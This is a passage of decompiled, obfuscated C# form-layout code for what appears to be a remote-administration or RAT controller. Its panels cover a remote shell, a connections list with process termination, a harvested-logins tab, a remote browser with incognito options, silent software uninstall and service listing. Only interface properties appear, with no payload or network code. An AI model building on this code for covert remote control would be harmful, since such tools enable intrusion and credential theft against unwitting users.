        this.vmethod_510().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_510().BackColor = Color.Black;
        this.vmethod_510().DetectUrls = false;
        this.vmethod_510().Enabled = false;
        this.vmethod_510().Font = new Font("Consolas", 10f);
        this.vmethod_510().ForeColor = SystemColors.ScrollBar;
        this.vmethod_510().Location = new Point(0, 0x206);
        this.vmethod_510().Margin = new Padding(2);
        this.vmethod_510().Multiline = false;
        this.vmethod_510().Name = "rtShellInput";
        this.vmethod_510().Size = new Size(0x3cf, 0x1b);
        this.vmethod_510().TabIndex = 11;
        this.vmethod_510().Text = string.Empty;
        this.vmethod_352().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_352().BackColor = Color.Black;
        this.vmethod_352().Enabled = false;
        this.vmethod_352().Font = new Font("Consolas", 10f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_352().ForeColor = SystemColors.ScrollBar;
        this.vmethod_352().Location = new Point(0, 0x24);
        this.vmethod_352().Margin = new Padding(2);
        this.vmethod_352().Name = "rtShellOutput";
        this.vmethod_352().ScrollBars = RichTextBoxScrollBars.Vertical;
        this.vmethod_352().Size = new Size(0x3cf, 0x1e1);
        this.vmethod_352().TabIndex = 8;
        this.vmethod_352().Text = string.Empty;
        this.vmethod_358().Controls.Add(this.vmethod_512());
        this.vmethod_358().Controls.Add(this.vmethod_494());
        this.vmethod_358().Controls.Add(this.vmethod_364());
        this.vmethod_358().Controls.Add(this.vmethod_718());
        this.vmethod_358().Location = new Point(4, 5);
        this.vmethod_358().Margin = new Padding(2);
        this.vmethod_358().Name = "tbConnections";
        this.vmethod_358().Padding = new Padding(2);
        this.vmethod_358().Size = new Size(0x3d0, 0x221);
        this.vmethod_358().TabIndex = 9;
        this.vmethod_358().Text = "Connections";
        this.vmethod_358().UseVisualStyleBackColor = true;
        this.vmethod_512().set_BackColor(SystemColors.Control);
        this.vmethod_512().set_CircleWidth(20f);
        this.vmethod_512().set_GetAnimationColor(Color.DeepSkyBlue);
        this.vmethod_512().set_GetAnimationSpeed(100);
        this.vmethod_512().set_GetBaseColor(Color.SkyBlue);
        this.vmethod_512().Location = new Point(0xf2, 0xcf);
        this.vmethod_512().MinimumSize = new Size(80, 80);
        this.vmethod_512().Name = "pbConnectionsSplash";
        this.vmethod_512().set_NumberOfCircles(45f);
        this.vmethod_512().set_Radian(180.0);
        this.vmethod_512().Size = new Size(0xa1, 0xa1);
        this.vmethod_512().set_Smoothing(SmoothingMode.HighQuality);
        this.vmethod_512().TabIndex = 0x2e;
        this.vmethod_512().Visible = false;
        this.vmethod_494().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_494().AutoSize = false;
        this.vmethod_494().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_494().Dock = DockStyle.None;
        this.vmethod_494().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray30 = new ToolStripItem[] { this.vmethod_496(), this.vmethod_498(), this.vmethod_500(), this.vmethod_502(), this.vmethod_504(), this.vmethod_676(), this.vmethod_506() };
        this.vmethod_494().Items.AddRange(itemArray30);
        this.vmethod_494().Location = new Point(2, 0x20b);
        this.vmethod_494().Name = "ssConnectionsStatus";
        this.vmethod_494().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_494().Size = new Size(0x3cc, 20);
        this.vmethod_494().SizingGrip = false;
        this.vmethod_494().Stretch = false;
        this.vmethod_494().TabIndex = 0x20;
        this.vmethod_494().Text = "stStatus";
        this.vmethod_496().AutoSize = false;
        this.vmethod_496().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_496().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_496().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_496().Name = "tsConnectionsEndpoints";
        this.vmethod_496().Size = new Size(140, 0x12);
        this.vmethod_496().Text = "Endpoints: N/A";
        this.vmethod_496().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_498().AutoSize = false;
        this.vmethod_498().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_498().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_498().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_498().Name = "tsConnectionsTCP";
        this.vmethod_498().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_498().Size = new Size(140, 0x12);
        this.vmethod_498().Text = "TCP: N/A";
        this.vmethod_498().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_500().AutoSize = false;
        this.vmethod_500().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_500().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_500().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_500().Name = "tsConnectionsUDP";
        this.vmethod_500().Size = new Size(140, 0x12);
        this.vmethod_500().Text = "UDP: N/A";
        this.vmethod_500().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_502().AutoSize = false;
        this.vmethod_502().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_502().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_502().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_502().Name = "tsConnectionsEstablished";
        this.vmethod_502().Size = new Size(140, 0x12);
        this.vmethod_502().Text = "Established: N/A";
        this.vmethod_502().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_504().AutoSize = false;
        this.vmethod_504().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_504().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_504().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_504().Name = "tsConnectionsListening";
        this.vmethod_504().Size = new Size(140, 0x12);
        this.vmethod_504().Text = "Listening: N/A";
        this.vmethod_504().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_676().AutoSize = false;
        this.vmethod_676().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_676().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_676().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_676().Name = "tsConnectionsSelected";
        this.vmethod_676().Size = new Size(0xba, 0x12);
        this.vmethod_676().Spring = true;
        this.vmethod_676().Text = "Selected: 0";
        this.vmethod_676().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_506().Alignment = ToolStripItemAlignment.Right;
        this.vmethod_506().ForeColor = Color.FromArgb(0xc0, 0xc0, 0);
        this.vmethod_506().Margin = new Padding(2, 3, -6, 2);
        this.vmethod_506().Maximum = 1;
        this.vmethod_506().Name = "tsConnectionsProgress";
        this.vmethod_506().Size = new Size(0x52, 15);
        this.vmethod_506().Step = 1;
        this.vmethod_506().Style = ProgressBarStyle.Continuous;
        this.vmethod_360().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray31 = new ToolStripItem[] { this.vmethod_362(), this.vmethod_366(), this.vmethod_370(), this.vmethod_376(), this.vmethod_368(), this.vmethod_378() };
        this.vmethod_360().Items.AddRange(itemArray31);
        this.vmethod_360().Name = "cmsConnections";
        this.vmethod_360().Size = new Size(170, 0x68);
        this.vmethod_362().Name = "RefreshToolStripMenuItem1";
        this.vmethod_362().Size = new Size(0xa9, 0x16);
        this.vmethod_362().Text = "Refresh";
        this.vmethod_366().Name = "ToolStripMenuItem15";
        this.vmethod_366().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray32 = new ToolStripItem[] { this.vmethod_374(), this.vmethod_442(), this.vmethod_372() };
        this.vmethod_370().DropDownItems.AddRange(itemArray32);
        this.vmethod_370().Name = "CopySelectedToolStripMenuItem1";
        this.vmethod_370().Size = new Size(0xa9, 0x16);
        this.vmethod_370().Text = "Copy to clipboard";
        this.vmethod_374().Name = "SelectedToolStripMenuItem";
        this.vmethod_374().Size = new Size(0x76, 0x16);
        this.vmethod_374().Text = "Selected";
        this.vmethod_442().Name = "ToolStripMenuItem21";
        this.vmethod_442().Size = new Size(0x73, 6);
        this.vmethod_372().Name = "CopyAllToolStripMenuItem";
        this.vmethod_372().Size = new Size(0x76, 0x16);
        this.vmethod_372().Text = "All";
        this.vmethod_376().Name = "ToolStripMenuItem16";
        this.vmethod_376().Size = new Size(0xa6, 6);
        this.vmethod_368().Enabled = false;
        this.vmethod_368().Name = "CloseConnectionToolStripMenuItem";
        this.vmethod_368().Size = new Size(0xa9, 0x16);
        this.vmethod_368().Text = "Close connection";
        this.vmethod_378().Name = "TerminateProcessToolStripMenuItem";
        this.vmethod_378().Size = new Size(0xa9, 0x16);
        this.vmethod_378().Text = "Terminate process";
        this.vmethod_416().Controls.Add(this.vmethod_468());
        this.vmethod_416().Controls.Add(this.vmethod_418());
        this.vmethod_416().Location = new Point(4, 5);
        this.vmethod_416().Margin = new Padding(2);
        this.vmethod_416().Name = "tbLogins";
        this.vmethod_416().Padding = new Padding(2);
        this.vmethod_416().Size = new Size(0x3d0, 0x221);
        this.vmethod_416().TabIndex = 10;
        this.vmethod_416().Text = "Logins";
        this.vmethod_416().UseVisualStyleBackColor = true;
        this.vmethod_468().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_468().AutoSize = false;
        this.vmethod_468().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_468().Dock = DockStyle.None;
        this.vmethod_468().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray33 = new ToolStripItem[] { this.vmethod_470() };
        this.vmethod_468().Items.AddRange(itemArray33);
        this.vmethod_468().Location = new Point(2, 0x20b);
        this.vmethod_468().Name = "ssCredentialsLogins";
        this.vmethod_468().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_468().Size = new Size(0x3cc, 20);
        this.vmethod_468().SizingGrip = false;
        this.vmethod_468().Stretch = false;
        this.vmethod_468().TabIndex = 0x1f;
        this.vmethod_468().Text = "stStatus";
        this.vmethod_470().AutoSize = false;
        this.vmethod_470().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_470().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_470().Margin = new Padding(-5, 3, -7, 0);
        this.vmethod_470().Name = "tsCredentialsLogins";
        this.vmethod_470().Size = new Size(0x3d0, 0x11);
        this.vmethod_470().Spring = true;
        this.vmethod_470().Text = "Logins: N/A";
        this.vmethod_470().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_420().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_420().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray34 = new ToolStripItem[] { this.vmethod_422(), this.vmethod_424(), this.vmethod_426() };
        this.vmethod_420().Items.AddRange(itemArray34);
        this.vmethod_420().Name = "cmsInfo";
        this.vmethod_420().Size = new Size(170, 0x36);
        this.vmethod_422().Name = "tsmCredentialsLoginsRefresh";
        this.vmethod_422().Size = new Size(0xa9, 0x16);
        this.vmethod_422().Text = "Refresh";
        this.vmethod_424().Name = "ToolStripSeparator2";
        this.vmethod_424().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray35 = new ToolStripItem[] { this.vmethod_428(), this.vmethod_430(), this.vmethod_432() };
        this.vmethod_426().DropDownItems.AddRange(itemArray35);
        this.vmethod_426().Name = "tsmCredentialsCopy";
        this.vmethod_426().Size = new Size(0xa9, 0x16);
        this.vmethod_426().Text = "Copy to clipboard";
        this.vmethod_428().Name = "tsmCredentialsLoginsCopySelected";
        this.vmethod_428().Size = new Size(0x76, 0x16);
        this.vmethod_428().Text = "Selected";
        this.vmethod_430().Name = "ToolStripMenuItem20";
        this.vmethod_430().Size = new Size(0x73, 6);
        this.vmethod_432().Name = "tsmCredentialsLoginsCopyAll";
        this.vmethod_432().Size = new Size(0x76, 0x16);
        this.vmethod_432().Text = "All";
        this.vmethod_460().Controls.Add(this.vmethod_714());
        this.vmethod_460().Controls.Add(this.vmethod_708());
        this.vmethod_460().Controls.Add(this.vmethod_684());
        this.vmethod_460().Controls.Add(this.vmethod_678());
        this.vmethod_460().Controls.Add(this.vmethod_514());
        this.vmethod_460().Controls.Add(this.vmethod_516());
        this.vmethod_460().Controls.Add(this.vmethod_466());
        this.vmethod_460().Controls.Add(this.vmethod_462());
        this.vmethod_460().Controls.Add(this.vmethod_682());
        this.vmethod_460().Controls.Add(this.vmethod_680());
        this.vmethod_460().Controls.Add(this.vmethod_464());
        this.vmethod_460().Location = new Point(4, 5);
        this.vmethod_460().Margin = new Padding(2);
        this.vmethod_460().Name = "tbRemoteBrowser";
        this.vmethod_460().Size = new Size(0x3d0, 0x221);
        this.vmethod_460().TabIndex = 11;
        this.vmethod_460().Text = "Remote browser";
        this.vmethod_460().UseVisualStyleBackColor = true;
        this.vmethod_714().BackColorState.Disabled = Color.FromArgb(0xcc, 0xcc, 0xcc);
        this.vmethod_714().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_714().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_714().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_714().Border.HoverVisible = true;
        this.vmethod_714().Border.Rounding = 6;
        this.vmethod_714().Border.Thickness = 1;
        this.vmethod_714().Border.Type = ShapeTypes.Rounded;
        this.vmethod_714().Border.Visible = true;
        this.vmethod_714().ButtonBorder.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_714().ButtonBorder.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_714().ButtonBorder.HoverVisible = true;
        this.vmethod_714().ButtonBorder.Rounding = 6;
        this.vmethod_714().ButtonBorder.Thickness = 1;
        this.vmethod_714().ButtonBorder.Type = ShapeTypes.Rounded;
        this.vmethod_714().ButtonBorder.Visible = true;
        this.vmethod_714().ButtonBottomMouseState = MouseStates.Normal;
        this.vmethod_714().ButtonColorState.Disabled = Color.FromArgb(220, 220, 220);
        this.vmethod_714().ButtonColorState.Enabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_714().ButtonColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_714().ButtonColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_714().ButtonTopMouseState = MouseStates.Normal;
        this.vmethod_714().Location = new Point(0x6d, 7);
        this.vmethod_714().Minimum = 1;
        this.vmethod_714().MouseState = MouseStates.Normal;
        this.vmethod_714().Name = "tbRemoteBrowserQuality";
        this.vmethod_714().Orientation = Orientation.Horizontal;
        this.vmethod_714().Size = new Size(0x53, 0x13);
        this.vmethod_714().TabIndex = 0x5f;
        this.vmethod_714().TabStop = false;
        this.vmethod_714().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_714().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_714().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_714().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_714().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_714().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_714().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_714().ThumbBorder.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_714().ThumbBorder.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_714().ThumbBorder.HoverVisible = true;
        this.vmethod_714().ThumbBorder.Rounding = 6;
        this.vmethod_714().ThumbBorder.Thickness = 1;
        this.vmethod_714().ThumbBorder.Type = ShapeTypes.Rounded;
        this.vmethod_714().ThumbBorder.Visible = true;
        this.vmethod_714().ThumbColorState.Disabled = Color.FromArgb(0xdd, 0xdd, 0xdd);
        this.vmethod_714().ThumbColorState.Enabled = Color.FromArgb(0xdd, 0xdd, 0xdd);
        this.vmethod_714().ThumbColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_714().ThumbColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_714().ThumbGripVisible = true;
        this.vmethod_714().ThumbMouseState = MouseStates.Normal;
        this.vmethod_714().TrackPressed = Color.FromArgb(10, 0, 0, 0);
        this.vmethod_714().Value = 50;
        this.vmethod_708().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_708().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_708().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_708().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_708().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_708().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_708().Border.HoverVisible = true;
        this.vmethod_708().Border.Rounding = 6;
        this.vmethod_708().Border.Thickness = 1;
        this.vmethod_708().Border.Type = ShapeTypes.Rounded;
        this.vmethod_708().Border.Visible = true;
        this.vmethod_708().DialogResult = DialogResult.None;
        this.vmethod_708().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_708().Image = null;
        this.vmethod_708().Location = new Point(1, 3);
        this.vmethod_708().MouseState = MouseStates.Normal;
        this.vmethod_708().Name = "btnRemoteBrowserStartStop";
        this.vmethod_708().Size = new Size(0x3f, 0x18);
        this.vmethod_708().TabIndex = 0x2a;
        this.vmethod_708().Text = "Start";
        this.vmethod_708().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_708().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_708().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_708().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_708().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_708().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_708().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_708().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_684().AutoSize = true;
        this.vmethod_684().Location = new Point(360, 8);
        this.vmethod_684().Name = "chkForceProfile";
        this.vmethod_684().Size = new Size(0x6b, 0x11);
        this.vmethod_684().TabIndex = 0x5d;
        this.vmethod_684().TabStop = false;
        this.vmethod_684().Text = "Force new profile";
        this.vmethod_684().UseVisualStyleBackColor = true;
        this.vmethod_678().AutoSize = true;
        this.vmethod_678().Location = new Point(0xe0, 8);
        this.vmethod_678().Name = "chkIncognito";
        this.vmethod_678().Size = new Size(0x63, 0x11);
        this.vmethod_678().TabIndex = 0x29;
        this.vmethod_678().TabStop = false;
        this.vmethod_678().Text = "Incognito mode";
        this.vmethod_678().UseVisualStyleBackColor = true;
        this.vmethod_514().AutoSize = true;
        this.vmethod_514().BackColor = Color.Transparent;
        this.vmethod_514().ForeColor = Color.Black;
        this.vmethod_514().Location = new Point(0xc0, 10);
        this.vmethod_514().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_514().Name = "lblRemoteScreenQualityValue";
        this.vmethod_514().Size = new Size(0x1b, 13);
        this.vmethod_514().TabIndex = 0x26;
        this.vmethod_514().Text = "50%";
        this.vmethod_516().AutoSize = true;
        this.vmethod_516().BackColor = Color.Transparent;
        this.vmethod_516().ForeColor = Color.Black;
        this.vmethod_516().Location = new Point(0x44, 9);
        this.vmethod_516().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_516().Name = "lblRemoteBrowserQuality";
        this.vmethod_516().Size = new Size(0x2a, 13);
        this.vmethod_516().TabIndex = 0x25;
        this.vmethod_516().Text = "Quality:";
        this.vmethod_466().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_466().Location = new Point(2, 0x1c9);
        this.vmethod_466().Margin = new Padding(2);
        this.vmethod_466().Name = "rtRemoteBrowser";
        this.vmethod_466().ScrollBars = RichTextBoxScrollBars.Vertical;
        this.vmethod_466().Size = new Size(0x3cc, 0x55);
        this.vmethod_466().TabIndex = 0x23;
        this.vmethod_466().Text = string.Empty;
        this.vmethod_462().Anchor = AnchorStyles.Right | AnchorStyles.Top;
        this.vmethod_462().BackColor = Color.Transparent;
        this.vmethod_462().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_462().ForeColor = Color.Black;
        this.vmethod_462().Location = new Point(0x2b4, 5);
        this.vmethod_462().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_462().Name = "lblRemoteBrowserFPS";
        this.vmethod_462().Size = new Size(0x117, 0x15);
        this.vmethod_462().TabIndex = 0x21;
        this.vmethod_462().Text = "FPS: N/A";
        this.vmethod_462().TextAlign = ContentAlignment.MiddleRight;
        this.vmethod_520().Controls.Add(this.vmethod_540());
        this.vmethod_520().Controls.Add(this.vmethod_546());
        this.vmethod_520().Controls.Add(this.vmethod_548());
        this.vmethod_520().Controls.Add(this.vmethod_550());
        this.vmethod_520().Location = new Point(4, 5);
        this.vmethod_520().Margin = new Padding(2);
        this.vmethod_520().Name = "tbSoftware";
        this.vmethod_520().Padding = new Padding(2);
        this.vmethod_520().Size = new Size(0x3d0, 0x221);
        this.vmethod_520().TabIndex = 12;
        this.vmethod_520().Text = "Software";
        this.vmethod_520().UseVisualStyleBackColor = true;
        this.vmethod_540().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_540().AutoSize = false;
        this.vmethod_540().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_540().Dock = DockStyle.None;
        this.vmethod_540().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray36 = new ToolStripItem[] { this.vmethod_542(), this.vmethod_674(), this.vmethod_544() };
        this.vmethod_540().Items.AddRange(itemArray36);
        this.vmethod_540().Location = new Point(2, 0x20b);
        this.vmethod_540().Name = "ssSoftwareStatus";
        this.vmethod_540().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_540().Size = new Size(0x3cc, 20);
        this.vmethod_540().SizingGrip = false;
        this.vmethod_540().Stretch = false;
        this.vmethod_540().TabIndex = 0x38;
        this.vmethod_540().Text = "stStatus";
        this.vmethod_542().AutoSize = false;
        this.vmethod_542().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_542().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_542().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_542().Name = "tsSoftwareCount";
        this.vmethod_542().Size = new Size(140, 0x12);
        this.vmethod_542().Text = "Installed software: N/A";
        this.vmethod_542().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_674().AutoSize = false;
        this.vmethod_674().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_674().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_674().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_674().Name = "tsSoftwareSelected";
        this.vmethod_674().Size = new Size(0x2ea, 0x12);
        this.vmethod_674().Spring = true;
        this.vmethod_674().Text = "Selected: 0";
        this.vmethod_674().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_544().Alignment = ToolStripItemAlignment.Right;
        this.vmethod_544().ForeColor = Color.FromArgb(0xc0, 0xc0, 0);
        this.vmethod_544().Margin = new Padding(2, 3, -6, 2);
        this.vmethod_544().Maximum = 1;
        this.vmethod_544().Name = "tsSoftwareProgress";
        this.vmethod_544().Size = new Size(0x52, 15);
        this.vmethod_544().Step = 1;
        this.vmethod_544().Style = ProgressBarStyle.Continuous;
        this.vmethod_546().set_BackColor(SystemColors.Control);
        this.vmethod_546().set_CircleWidth(20f);
        this.vmethod_546().set_GetAnimationColor(Color.DeepSkyBlue);
        this.vmethod_546().set_GetAnimationSpeed(100);
        this.vmethod_546().set_GetBaseColor(Color.SkyBlue);
        this.vmethod_546().Location = new Point(0x145, 0xcc);
        this.vmethod_546().MinimumSize = new Size(80, 80);
        this.vmethod_546().Name = "pbSoftwareSplash";
        this.vmethod_546().set_NumberOfCircles(45f);
        this.vmethod_546().set_Radian(180.0);
        this.vmethod_546().Size = new Size(0xa1, 0xa1);
        this.vmethod_546().set_Smoothing(SmoothingMode.HighQuality);
        this.vmethod_546().TabIndex = 0x35;
        this.vmethod_546().Visible = false;
        this.vmethod_524().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray37 = new ToolStripItem[] { this.vmethod_526(), this.vmethod_528(), this.vmethod_530(), this.vmethod_538(), this.vmethod_596() };
        this.vmethod_524().Items.AddRange(itemArray37);
        this.vmethod_524().Name = "cmsConnections";
        this.vmethod_524().Size = new Size(170, 0x52);
        this.vmethod_526().Name = "RefreshMenuItem22";
        this.vmethod_526().Size = new Size(0xa9, 0x16);
        this.vmethod_526().Text = "Refresh";
        this.vmethod_528().Name = "ToolStripSeparator3";
        this.vmethod_528().Size = new Size(0xa6, 6);
        ToolStripItem[] itemArray38 = new ToolStripItem[] { this.vmethod_532(), this.vmethod_534(), this.vmethod_536() };
        this.vmethod_530().DropDownItems.AddRange(itemArray38);
        this.vmethod_530().Name = "CopyMenuItem23";
        this.vmethod_530().Size = new Size(0xa9, 0x16);
        this.vmethod_530().Text = "Copy to clipboard";
        this.vmethod_532().Name = "SelectedMenuItem24";
        this.vmethod_532().Size = new Size(0x76, 0x16);
        this.vmethod_532().Text = "Selected";
        this.vmethod_534().Name = "ToolStripSeparator4";
        this.vmethod_534().Size = new Size(0x73, 6);
        this.vmethod_536().Name = "AllMenuItem25";
        this.vmethod_536().Size = new Size(0x76, 0x16);
        this.vmethod_536().Text = "All";
        this.vmethod_538().Name = "ToolStripSeparator5";
        this.vmethod_538().Size = new Size(0xa6, 6);
        this.vmethod_596().Enabled = false;
        this.vmethod_596().Name = "UninstallMenuItem26";
        this.vmethod_596().Size = new Size(0xa9, 0x16);
        this.vmethod_596().Text = "Silent uninstall";
        this.vmethod_564().Controls.Add(this.vmethod_566());
        this.vmethod_564().Controls.Add(this.vmethod_568());
        this.vmethod_564().Controls.Add(this.vmethod_576());
        this.vmethod_564().Controls.Add(this.vmethod_578());
        this.vmethod_564().Location = new Point(4, 5);
        this.vmethod_564().Name = "tbServices";
        this.vmethod_564().Padding = new Padding(3);
        this.vmethod_564().Size = new Size(0x3d0, 0x221);
        this.vmethod_564().TabIndex = 13;
        this.vmethod_564().Text = "Services";
        this.vmethod_564().UseVisualStyleBackColor = true;
        this.vmethod_566().set_BackColor(SystemColors.Control);
        this.vmethod_566().set_CircleWidth(20f);
        this.vmethod_566().set_GetAnimationColor(Color.DeepSkyBlue);
        this.vmethod_566().set_GetAnimationSpeed(100);
        this.vmethod_566().set_GetBaseColor(Color.SkyBlue);
        this.vmethod_566().Location = new Point(0xf1, 0xb8);
        this.vmethod_566().MinimumSize = new Size(80, 80);
        this.vmethod_566().Name = "pbServicesSplash";
        this.vmethod_566().set_NumberOfCircles(45f);
        this.vmethod_566().set_Radian(180.0);
        this.vmethod_566().Size = new Size(0xa1, 0xa1);
        this.vmethod_566().set_Smoothing(SmoothingMode.HighQuality);
        this.vmethod_566().TabIndex = 50;
        this.vmethod_566().Visible = false;
        this.vmethod_568().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_568().AutoSize = false;
        this.vmethod_568().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_568().Dock = DockStyle.None;
        this.vmethod_568().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray39 = new ToolStripItem[] { this.vmethod_570(), this.vmethod_664(), this.vmethod_572(), this.vmethod_666(), this.vmethod_574() };
        this.vmethod_568().Items.AddRange(itemArray39);
        this.vmethod_568().Location = new Point(2, 0x20b);
        this.vmethod_568().Name = "ssServices";
        this.vmethod_568().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_568().Size = new Size(970, 20);
        this.vmethod_568().SizingGrip = false;
        this.vmethod_568().Stretch = false;
        this.vmethod_568().TabIndex = 0x31;
        this.vmethod_568().Text = "stStatus";
        this.vmethod_570().AutoSize = false;
        this.vmethod_570().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_570().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_570().Margin = new Padding(-1, 3, 0, 0);
        this.vmethod_570().Name = "tsServicesCount";
        this.vmethod_570().Size = new Size(160, 0x11);
        this.vmethod_570().Text = "Services: N/A";
        this.vmethod_570().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_664().AutoSize = false;
        this.vmethod_664().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_664().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_664().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_664().Name = "tsServicesStopped";
        this.vmethod_664().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_664().Size = new Size(160, 0x11);
        this.vmethod_664().Text = "Stopped: N/A";
        this.vmethod_664().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_572().AutoSize = false;
        this.vmethod_572().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_572().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_572().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_572().Name = "tsServicesRunning";
        this.vmethod_572().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_572().Size = new Size(160, 0x11);
        this.vmethod_572().Text = "Running: N/A";
        this.vmethod_572().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_666().AutoSize = false;
        this.vmethod_666().BorderSides = ToolStripStatusLabelBorderSides.All;
